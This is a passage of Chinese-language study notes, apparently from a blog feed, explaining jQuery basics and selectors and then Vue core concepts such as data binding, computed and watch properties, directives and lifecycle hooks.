<pre class="language-javascript" data-language="javascript"><code class="language-javascript">字符串<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"分割字符"</span><span class="token punctuation">)</span></code></pre>
<h2 id="jQuery">jQuery</h2>
<h3 id="JavaScript-库">JavaScript 库</h3>
<p>​	JavaScript库：即 library，是一个封装好的特定的集合（方法和函数）。从封装一大堆函数的角度理解库，就是在这个库中，封装了很多预先定义好的函数在里面，比如动画animate、hide、show，比如获取元素等。</p>
<blockquote>
<p>简单理解： 就是一个JS 文件，里面对我们原生js代码进行了封装，存放到里面。这样我们可以快速高效的使用这些封装好的功能了。</p>
<p>比如 jQuery，就是为了快速方便的操作DOM，里面基本都是函数（方法）。</p>
</blockquote>
<p>​	常见的JavaScript 库：jQuery、Prototype、YUI、Dojo、Ext JS、移动端的zepto等，这些库都是对原生 JavaScript 的封装，内部都是用 JavaScript 实现的，我们主要学习的是 jQuery。</p>
<h3 id="jQuery的概念">jQuery的概念</h3>
<p>​	jQuery总体概况如下 :</p>
<ul>
<li>
<p>jQuery 是一个快速、简洁的 JavaScript 库，其设计的宗旨是“write Less，Do More”，即倡导写更少的代码，做更多的事情。</p>
</li>
<li>
<p>j 就是 JavaScript；   Query 查询； 意思就是查询js，把js中的DOM操作做了封装，我们可以快速的查询使用里面的功能。</p>
</li>
<li>
<p>jQuery 封装了 JavaScript 常用的功能代码，优化了 DOM 操作、事件处理、动画设计和 Ajax 交互。</p>
</li>
<li>
<p>学习jQuery本质： 就是学习调用这些函数（方法）。</p>
</li>
<li>
<p>jQuery 出现的目的是加快前端人员的开发速度，我们可以非常方便的调用和使用它，从而提高开发效率。</p>
<p><img src="https://s2.loli.net/2022/01/25/rMR6s7VpnSa4DtF.png" alt="jQuery概述"></p>
</li>
</ul>
<h3 id="体验jQuery">体验jQuery</h3>
<p>​	步骤：</p>
<ul>
<li>引入jQuery文件。</li>
<li>在文档最末尾插入 script 标签，书写体验代码。</li>
<li>$(‘div’).hide() 可以隐藏盒子。</li>
</ul>
<h3 id="jQuery的入口函数">jQuery的入口函数</h3>
<p>​	jQuery中常见的两种入口函数：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 第一种: 简单易用。</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   
    <span class="token operator">...</span>  <span class="token comment">// 此处是页面 DOM 加载完成的入口</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> 

<span class="token comment">// 第二种: 繁琐，但是也可以实现</span>
<span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   <span class="token operator">...</span>  <span class="token comment">//  此处是页面DOM加载完成的入口</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>​	总结：</p>
<ol>
<li>等着 DOM 结构渲染完毕即可执行内部代码，不必等到所有外部资源加载完成，jQuery 帮我们完成了封装。</li>
<li>相当于原生 js 中的 DOMContentLoaded。</li>
<li>不同于原生 js 中的 load 事件是等页面文档、外部的 js 文件、css文件、图片加载完毕才执行内部代码。</li>
<li>更推荐使用第一种方式。</li>
</ol>
<h3 id="jQuery中的顶级对象">jQuery中的顶级对象$</h3>
<ol>
<li>$是 jQuery 的别称，在代码中可以使用 jQuery 代替，但一般为了方便，通常都直接使用 $ 。</li>
<li>$是jQuery的顶级对象，相当于原生JavaScript中的 window。把元素利用$包装成jQuery对象，就可以调用jQuery 的方法。</li>
</ol>
<h3 id="jQuery-对象和-DOM-对象">jQuery 对象和 DOM 对象</h3>
<p>​	使用 jQuery 方法和原生JS获取的元素是不一样的，总结如下 :</p>
<ol>
<li>用原生 JS 获取来的对象就是 DOM 对象</li>
<li>jQuery 方法获取的元素就是 jQuery 对象。</li>
<li>jQuery 对象本质是： 利用$对DOM 对象包装后产生的对象（伪数组形式存储）。</li>
</ol>
<blockquote>
<p>注意：</p>
<p>只有 jQuery 对象才能使用 jQuery 方法，DOM 对象则使用原生的 JavaScirpt 方法。</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/01/25/BGZSpImjyKvr51A.png" alt="jQuery对象和DOM对象"></p>
<h3 id="jQuery-对象和-DOM-对象转换">jQuery 对象和 DOM 对象转换</h3>
<p>​	DOM 对象与 jQuery 对象之间是可以相互转换的。因为原生js 比 jQuery 更大，原生的一些属性和方法 jQuery没有给我们封装. 要想使用这些属性和方法需要把jQuery对象转换为DOM对象才能使用。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 1.DOM对象转换成jQuery对象，方法只有一种</span>
<span class="token keyword">var</span> box <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'box'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 获取DOM对象</span>
<span class="token keyword">var</span> jQueryObject <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>box<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 把DOM对象转换为 jQuery 对象</span>

<span class="token comment">// 2.jQuery 对象转换为 DOM 对象有两种方法：</span>
<span class="token comment">//   2.1 jQuery对象[索引值]</span>
<span class="token keyword">var</span> domObject1 <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token comment">//   2.2 jQuery对象.get(索引值)</span>
<span class="token keyword">var</span> domObject2 <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>
<p>总结：实际开发比较常用的是把DOM对象转换为jQuery对象，这样能够调用功能更加强大的jQuery中的方法。</p>
<h2 id="jQuery-选择器">jQuery 选择器</h2>
<p>​	原生 JS 获取元素方式很多，很杂，而且兼容性情况不一致，因此 jQuery 给我们做了封装，使获取元素统一标准。</p>
<h3 id="基础选择器">基础选择器</h3>
<p>$(“选择器”)   //  里面选择器直接写 CSS 选择器即可，但是要加引号</p>
<p>​	<img src="https://s2.loli.net/2022/01/25/1Ezq2nr5pQxdTgP.png" alt="基础选择器"></p>
<h3 id="层级选择器">层级选择器</h3>
<p>​	层级选择器最常用的两个分别为：后代选择器和子代选择器。</p>
<p>​	<img src="https://s2.loli.net/2022/01/25/U1Ynbtu6CA5mapW.png" alt="层级选择器"></p>
<p><strong>基础选择器和层级选择器案例代码</strong></p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>我是div<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>我是nav div<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>我是p<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>我是ul 的<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>我是ul 的<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>我是ul 的<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".nav"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"ul li"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>
<h3 id="筛选选择器">筛选选择器</h3>
<p>​	筛选选择器，顾名思义就是在所有的选项中选择满足条件的进行筛选选择。常见如下 :</p>
<p><img src="https://s2.loli.net/2022/01/25/ULN5emaTc4MXFlk.png" alt="筛选选择器"></p>
<p><strong>案例代码</strong></p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>多个里面筛选几个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"ul li:first"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"color"</span><span class="token punctuation">,</span> <span class="token string">"red"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"ul li:eq(2)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"color"</span><span class="token punctuation">,</span> <span class="token string">"blue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"ol li:odd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"color"</span><span class="token punctuation">,</span> <span class="token string">"skyblue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"ol li:even"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"color"</span><span class="token punctuation">,</span> <span class="token string">"pink"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>
<p>另:  jQuery中还有一些筛选方法，类似DOM中的通过一个节点找另外一个节点，父、子、兄以外有所加强。</p>
<p><img src="https://s2.loli.net/2022/01/25/KBPNucQbqfgCMUY.png" alt="筛选方法"></p>
<p>偏重于记忆，演示代码略。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue</title>
    <url>/web/Vue/</url>
    <content><![CDATA[<div align="center"><h4>Vue</h4></div>
<p>Vue一套用于构建用户界面的<strong>渐进式</strong>JavaScript框架（Vue可以自底向上逐层的应用）</p>
<h3 id="Vue核心">Vue核心</h3>
<h4 id="Vue的特点">Vue的特点</h4>
<ul>
<li>采用<strong>组件化</strong>模式，提高代码复用率，让代码更好维护</li>
<li>声明式编码，让编码人员无需直接操作DOM，提高开发效率</li>
<li>使用虚拟DOM+优秀的Diff算法，尽量复用DOM节点</li>
</ul>
<h4 id="初识Vue">初识Vue</h4>
<ol>
<li>想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象</li>
<li>root容器里的代码依然复合html规范，只不过混入了一些Vue语法</li>
<li>root容器里的代码被称为Vue模板</li>
<li>注意区分js表达式和js语句，表达式：会生成一个值，可以放在任何一个需要值的地方</li>
</ol>
<h4 id="模板语法">模板语法</h4>
<p>插值语法：</p>
<ul>
<li>功能：用于解析标签内容</li>
<li>写法：</li>
</ul>
<p>指令语法：</p>
<ul>
<li>功能：用于解析标签（包括：标签属性、标签体内容、绑定事件）</li>
<li>举例：v-bind:href=&quot;xxx&quot;或者直接默哀好</li>
</ul>
<h4 id="数据绑定">数据绑定</h4>
<p>单向数据绑定：v-bind</p>
<p>双向数据绑定：v-model（表单类元素）value可以简写成v-model，因为v-model默认收集的就是value值</p>
<h4 id="el和data的两种写法">_el和data的两种写法</h4>
<table>
<thead>
<tr>
<th style="text-align:center">el</th>
<th style="text-align:center">data</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">new Vue时候配置el属性</td>
<td style="text-align:center">对象式</td>
</tr>
<tr>
<td style="text-align:center">先创建Vue实例，随后再通过vm.$mount(‘#root’)指定el的值</td>
<td style="text-align:center">函数式</td>
</tr>
</tbody>
</table>
<p><em><strong>由Vue管理的函数，一定不要写箭头函数</strong></em></p>
<h4 id="MVVM模型">_MVVM模型</h4>
<ol>
<li>M：模型（Model）：data中的数据</li>
<li>V ：视图（View)：模板代码</li>
<li>VM：视图模型（ViewModel)：Vue实例</li>
<li>data中的所有属性，最后都出现在了vm身上</li>
<li>vm身上所有的属性 及vue原型上所有属性，在vue模板中都可以直接使用</li>
</ol>
<h4 id="数据代理">数据代理</h4>
<p>Object.defineProperty\get()\set()</p>
<p>通过一个对象代理对另一个对象中属性的操作</p>
<h4 id="事件绑定">事件绑定</h4>
<ol>
<li>使用v-on：xxx或者@xxx绑定事件，其中xxx是事件名</li>
<li>事件的回调需要配置在methods对象汇总，最终会在vm上</li>
<li>methods中配置的函数，不要用箭头函数！否则this就不是vm了</li>
<li>methods中配置的函数，都是被vue所管理的函数，this的指向是vm或组件实例对象</li>
<li>@click=“demo”和@click=“demo($event)&quot;效果一致，但后者可以传参：</li>
</ol>
<p>vue中常用的按键别名：</p>
<ul>
<li>回车：enter</li>
<li>删除：delete（捕获删除和退格</li>
<li>退出：esc</li>
<li>空格：space</li>
<li>换行：tab</li>
</ul>
<p>vue未提供别名的按键，可以使用按键原实的key去绑定，但注意要转为kebab-case（短横线命名）</p>
<p>系统修饰键（用法特殊）：ctrl、alt、shift、meta</p>
<ul>
<li>配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才触发</li>
<li>配合keydown使用：正常触发事件</li>
</ul>
<p>也可以keycode去指定具体的按键（不推荐</p>
<p>vue.config.keyCodes.自定义键名  = 键码，可以去定制按键别名</p>
<h4 id="计算属性">计算属性</h4>
<ol>
<li>
<p>定义：要用的属性不存在，要通过已有的属性计算得来</p>
</li>
<li>
<p>原理：底层借助了Object.defineproperty方法提供的getter和setter</p>
<p>get什么时候调用？</p>
<ul>
<li>初次读取时、所依赖的数据发生变化时</li>
</ul>
<p>set什么时候调用？</p>
<ul>
<li>当值被修改时l</li>
</ul>
</li>
<li>
<p>优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便</p>
</li>
<li>
<p>备注：</p>
<p>计算属性最终会出现在vm上，直接读取使用即可</p>
<p>如果计算属性要被修改，那必须写set函数去相应修改，且set中要引起计算时依赖的数据发生。</p>
</li>
</ol>
<h4 id="监视属性">监视属性</h4>
<ol>
<li>
<p>当监视属性变化时，回调函数自动调用，进行相关操作</p>
</li>
<li>
<p>监视的属性必须同时存在，才能进行监视！！@</p>
</li>
<li>
<p>监视的两种写法：</p>
<ul>
<li>
<p>new Vue时传入watch配置</p>
</li>
<li>
<p>通过vm.$watch监视</p>
</li>
</ul>
</li>
</ol>
<h5 id="深度监视">深度监视</h5>
<ol>
<li>vue中的watch默认不监测对象内部值的改变（一层）</li>
<li>配置deep:true可以监测对象内部值得改变（多层）</li>
</ol>
<p><strong>备注：</strong></p>
<ol>
<li>vue自身可以监测对象内部值得改变，但是vue提供得watch默认不可以！</li>
<li>使用watch时根据数据得具体结构，决定是否采用深度监视</li>
</ol>
<h5 id="computed和watch之间的区别">computed和watch之间的区别</h5>
<ul>
<li>computed能完成的功能，watch都可以完成</li>
<li>watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作</li>
</ul>
<h5 id="两个重要原则">两个重要原则</h5>
<ul>
<li>所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或组件实例对象</li>
<li>所有不被Vue管理的函数（定时器的回调函数、ajax的回调函数、promise的回调函数等）最好写成箭头函数，这样this的指向才是vm或组件实例对象</li>
</ul>
<h4 id="绑定样式">绑定样式</h4>
<h5 id="class样式">class样式</h5>
<p>写法：class=“xxx” xxx可以是字符串、对象、数组</p>
<ul>
<li>字符串写法，适用于：样式的类名不确定，需要动态指定</li>
<li>数组写法，适用于：要绑定的样式个数不确定、名字也不确定</li>
<li>对象写法，适用于：要绑定的样式个数确定、名字也确定、但要动态决定用不用</li>
</ul>
<h5 id="style样式">style样式</h5>
<p>：style=”{fontSize:xxx}&quot;其中xxx是动态值</p>
<p>：style=“[a,b]&quot;其中ab是样式对象</p>
<h4 id="条件渲染">条件渲染</h4>
<p>1.v-if</p>
<ul>
<li>写法：</li>
<li>
<ul>
<li>v-if=&quot;“表达式”</li>
<li>v-else-if=“表达式”</li>
<li>v-else=“表达式”</li>
</ul>
</li>
<li>适用于：切换频率较低的场景</li>
<li>特点：不展示DOM元素直接被移除</li>
<li>注意：v-if可以和：v-else-if、v-else一起使用，但要求结构不能被打断</li>
</ul>
<p>2.v-show</p>
<ul>
<li>写法：v-show=“表达式”</li>
<li>适用于：切换频率较高的场景</li>
<li>特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉</li>
</ul>
<p>3.备注：使用v-if时，元素可能无法获取到，而是用v-show一定可以获取到</p>
<h4 id="列表渲染">列表渲染</h4>
<p>v-for指令</p>
<ul>
<li>用于展示列表数据</li>
<li>语法：v-for=“(item,index) in xxx” : key=“yyy”</li>
<li>可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）</li>
</ul>
<h4 id="key的内部原理">key的内部原理</h4>
<p>面试题:react、vue中的key有什么作用?(key的内部原理)</p>
<h5 id="1-虚拟DOM中key的作用">1.虚拟DOM中key的作用</h5>
<p>key是虚拟DON对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的<br>
虚拟DOM】 ,随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下:</p>
<h5 id="2-对比规则">2.对比规则</h5>
<p>(1).旧虚拟DOM中找到了与新虚拟DOM相同的key</p>
<ol>
<li>若虚拟DOM中内容没变,直接使用之前的真实DOM !</li>
<li>若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM.</li>
</ol>
<p>(2).旧虚拟DOM中未找到与新虚拟DOM相同的key</p>
<p>创建新的真实DOM,随后渲染到到页面。</p>
<h5 id="3-用index作为key可能会引发的问题">3.用index作为key可能会引发的问题</h5>
<ol>
<li>若对数据进行:逆序添加、逆序删除等破坏顺序操作:会产生没有必要的真实DOM更新==&gt;界面效果没问题，但效率低。</li>
<li>如果结构中还包含输入类的DON:会产生错误DOM更新==&gt;界面有问题。</li>
</ol>
<h5 id="4-开发中如何选择key">4.开发中如何选择key?</h5>
<ol>
<li>最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值。</li>
<li>如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。</li>
</ol>
<h4 id="Vue监视数据的原理">Vue监视数据的原理</h4>
<h5 id="1-vue会监视data中所有层次的数据">1.vue会监视data中所有层次的数据</h5>
<h5 id="2-如何监测对象中的数据">2.如何监测对象中的数据</h5>
<p>通过setter实现监视,且要在new Vue时就传入要监测的数据。</p>
<p>(1).对象中后追加的属性，Vue默认不做响应式处理</p>
<p>(2).如需给后添加的属性做响应式,请使用如下API</p>
<p>Vue.set(target.propertyName/index,value)或vm.$set(target，propertyName /index.value)</p>
<h5 id="3-如何监测数组中的数据">3.如何监测数组中的数据</h5>
<p>通过包裹数组更新元素的方法实现,本质就是做了两件事</p>
<p>(1).调用原生对应的方法对数组进行更新。</p>
<p>(2).重新解析模板,进而更新页面。</p>
<h5 id="4-在Vue修改数组中的某个元素一定要用如下方法">4.在Vue修改数组中的某个元素一定要用如下方法</h5>
<ol>
<li>使用这些AP:push()、pop()、shift()、unshift()、splice()、sort()、reverse()</li>
<li>Vue.set()或vm.$set()</li>
</ol>
<p>特别注意:Vue.set(）和vm.$set(）不能给vm或vm的根数据对象添加属性!!!</p>
<h4 id="收集表单数据">收集表单数据</h4>
<p>若&lt;input type=“text”/ &gt;， 则v-model收集的是value值，用户输入的就是value值。</p>
<p>若:&lt;input type=“radio”/ &gt;，则v-model收集的是value值，且要给标签配置value值。</p>
<p>若: &lt;input type=“checkbox” / &gt;</p>
<ul>
<li>
<p>1.没有配置input的value属性，那么收集的就是checked（勾选 or未勾选，是布尔值)</p>
</li>
<li>
<p>2.配置input的value属性:</p>
<p>(1)v-model的初始值是非数组，那么收集的就是checked（勾选or未勾选，是布尔值)</p>
<p>(2)v-model的初始值是数组，那么收集的的就是value组成的数组</p>
</li>
</ul>
<p><strong>备注</strong></p>
<p>v-model的三个修饰符:</p>
<ul>
<li>lazy:失去焦点再收集数据</li>
<li>number:输入字符串转为有效的数字</li>
<li>trim:输入首尾空格过滤</li>
</ul>
<h4 id="过滤器">过滤器</h4>
<p>定义:对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）</p>
<p>语法:</p>
<ol>
<li>注册过滤器:Vue.filter(name, callback)或new Vue{filters:{3}</li>
<li>使用过滤器:或v-bind:属性=“xxx│过滤器名&quot;</li>
</ol>
<p>备注:</p>
<ol>
<li>过滤器也可以接收额外参数、多个过滤器也可以串联</li>
<li>并没有改变原本的数据,是产生新的对应的数据</li>
</ol>
<h4 id="内置指令">内置指令</h4>
<p>我们学过的指令</p>
<ul>
<li>
<p>v-bind :单向绑定解析表达式,可简写为:xXX</p>
</li>
<li>
<p>v-model :双向数据绑定</p>
</li>
<li>
<p>v-for:遍历数组/对象/字符串</p>
</li>
<li>
<p>v-on:绑定事件监听,可简写为@</p>
</li>
<li>
<p>v-if:条件渲染（动态控制节点是否存存在)</p>
</li>
<li>
<p>v-else:条件渲染（动态控制节点是否存存在)</p>
</li>
<li>
<p>v-show:条件渲染（动态控制节点是否展示)</p>
</li>
<li>
<p>v-text指令:</p>
<p>1.作用:向其所在的节点中渲染文季内容。</p>
<p>2.与插值语法的区别: v-text会替换掉节点中的内容，则不会。</p>
</li>
<li>
<p>v-html指令:<br>
1.作用:向指定节点中渲染包含html结构的内容。</p>
<p>2.与插值语法的区别:</p>
<p>(1).v-html会替换掉节点中所有的内容，则不会。</p>
<p>(2).v-html可以识别html结构。</p>
<p>3.严重注意:v-html有安全性问题!!!</p>
<p>(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。</p>
<p>(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上!</p>
</li>
<li>
<p>v-cloak指令(没有值):</p>
<p>1,本质是一个特殊属性，Vue实例创建完毕并接管容器后，会朋掉v-cloak属性。</p>
<p>2.使用css配合v-cloak可以解决网速慢时页面展示出的问题。</p>
</li>
<li>
<p>v-once指令;</p>
<p>1.v-oncq所在节点在初次动态渲染后,就视为静态内容了。</p>
<p>2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。</p>
</li>
</ul>
<h4 id="自定义指令">自定义指令</h4>
<p>需求1:定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</p>
<p>需求2:定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。自定义指令总结:</p>
<p>一、定义语法:</p>
<p>(1).局部指令</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">new Vue(&#123;
directives:&#123;指令名:配置对象&#125;
&#125;)
或者
new Vue(&#123;
directives()&#123;指令名:回调对象&#125;
)</code></pre>
<p>(2).全局指令</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">Vue.directive(指令名,配置对象）或 Vue.directive(指令名,回调函数)</code></pre>
<p>二、配置对象中常用的3个回调;</p>
<ol>
<li>bind:指令与元素成功绑定时调用。</li>
<li>inserted:指令所在元素被插入页面时调用。</li>
<li>update:指令所在模板结构被重新解析时调用。</li>
</ol>
<p>三、备注:</p>
<ol>
<li>指令定义时不加v-，但使用时要加v-;</li>
<li>指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。</li>
</ol>
<h4 id="生命周期">生命周期</h4>
<p>1.又名:生命周期回调函数、生命周期函数、生命周期钩子。</p>
<p>2.是什么:Vue在关键时刻帮我们调用的一些特殊名称的函数。</p>
<p>3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。</p>
<p>4.生命周期函数中的this指向是vm或组件实例对象。</p>
<p>常用的生命周期钩子:</p>
<ol>
<li>mounted:发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作</li>
<li>beforeDestroy:清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。</li>
</ol>
<p>关于销毁Vue实例</p>
<ol>
<li>销毁后借助Vue开发者工具看不到任何信息。</li>
